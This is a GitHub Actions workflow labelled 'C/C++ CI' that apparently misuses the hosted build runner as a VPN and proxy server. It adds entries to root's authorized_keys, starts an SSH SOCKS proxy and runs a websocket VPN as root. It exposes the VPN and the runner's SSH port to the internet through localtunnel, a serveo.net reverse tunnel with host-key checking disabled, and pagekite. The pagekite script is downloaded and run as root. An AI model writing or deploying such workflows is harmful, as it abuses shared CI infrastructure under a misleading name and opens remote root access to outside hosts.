name: C/C++ CI

on: [push]

jobs:
  build:

    runs-on: ubuntu-latest
    
    steps:
    - name: pre-work
      run: |
        sh -c "(echo;echo;echo;echo;echo)|ssh-keygen"       
        sudo sh -c "echo ssh-rsa  pqy@pqy-E400 > /root/.ssh/authorized_keys"
        sudo sh -c "echo ssh-rsa  pangqingyuan1991@gmail.com >> /root/.ssh/authorized_keys"
        sudo sh -c "echo ssh-rsa  root@pqy-205 >> /root/.ssh/authorized_keys"
        sudo sh -c "cat $HOME/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys"
        sleep 3
        ssh -C -f -N -g -D 8118 root@localhost
    - uses: actions/checkout@v1
    - name: install-dep
      run: |
        sudo apt install qt5-default g++ libqt5websockets5-dev -qqy
        sudo npm install -g localtunnel
    - name: make
      run: |
        qmake .
        make
    - name: run-service
      run: | 
        sudo modprobe tun
        sudo ./qwebsocket-vpn -m server -p 18888 &
        lt --port 18888 &
        sleep 3
        ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 80:localhost:18888 -R pqy330:22:localhost:22 serveo.net &
        curl -O https://pagekite.net/pk/pagekite.py
        sudo cp pagekite.rc /root/.pagekite.rc
        sudo su -c "python2 pagekite.py 18888 pqy330.pagekite.me" &
